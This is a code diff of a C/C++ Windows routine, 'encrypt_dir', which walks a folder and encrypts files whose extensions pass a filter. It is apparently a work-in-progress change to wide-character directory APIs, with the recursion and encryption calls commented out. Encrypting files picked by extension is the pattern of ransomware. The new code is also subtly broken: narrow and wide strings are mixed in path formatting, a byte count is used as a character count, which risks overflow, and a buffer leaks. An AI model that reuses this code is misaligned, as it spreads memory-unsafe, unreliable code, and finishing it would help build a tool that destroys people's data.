@@ -680,9 +680,8 @@ bool valid_ext(const char* infile) {
 // encrypt or decrypt a file using public/private keys
 void encrypt_dir(const char *infile, int enc) {
 	DWORD att;
-	DIR *pdir;
-	struct dirent *pent;
-	struct stat statbuf;
+	WDIR *pdir;
+	struct wdirent *pent;
 	int fileact = WC_ENCRYPT;
 	att = GetFileAttributes(infile);
 	if (enc != WC_ENCRYPT_DIR)
@@ -693,31 +692,39 @@ void encrypt_dir(const char *infile, int enc) {
 		printf("\n  [ dirmode unable to access %s", infile);
 		return;
 	}
-	pdir = opendir(infile);
+
+	setlocale(LC_CTYPE, "");
+	int newsize = strlen(infile) + 1;
+	wchar_t * winfile = new wchar_t[newsize];
+
+	// Convert char* string to a wchar_t* string.  
+	size_t convertedChars = 0;
+	mbstowcs_s(&convertedChars, winfile, newsize, infile, _TRUNCATE);
+	pdir = wopendir(winfile);
 	if (!pdir) {
 		printf("opendir() failure; terminating\n");
 	}
-	while ((pent = readdir(pdir)) != NULL)
+	while ((pent = wreaddir(pdir)) != NULL)
 	{
-		stat(pent->d_name, &statbuf);
-		if (strcmp(".", pent->d_name) == 0 || strcmp("..", pent->d_name) == 0)
+		if (wcscmp(L".", pent->d_name) == 0 || wcscmp(L"..", pent->d_name) == 0)
 			continue;
 		if (pent->d_type == DT_DIR) {
-			printf("%s <dir>\n", pent->d_name);
+			wprintf(L"dir:%s\n", pent->d_name);
 			char path[MAX_PATH] = {0};
-			snprintf(path, sizeof(path), "%s\\%s", infile, pent->d_name);
-			encrypt_dir(path, enc);
+			snprintf(path, sizeof(path), "%s\\%s", winfile, pent->d_name);
+			//encrypt_dir(path, enc);
 		}
 		else {
-			char path[MAX_PATH] = { 0 };
-			snprintf(path, sizeof(path), "%s\\%s", infile, pent->d_name);
-			if(fileact == WC_ENCRYPT && valid_ext(path))
+			WCHAR path[MAX_PATH] = { 0 };
+			_snwprintf(path, sizeof(path), L"%s\\%s", winfile, pent->d_name);
+			wprintf(L"file: %s\n", path);
+			/*if(fileact == WC_ENCRYPT && valid_ext(path))
 				encrypt_file(path, fileact);
 			else if (fileact == WC_DECRYPT)
-				encrypt_file(path, fileact);
+				encrypt_file(path, fileact);*/
 		}
 	}
-	closedir(pdir);
+	wclosedir(pdir);
 
 }
 
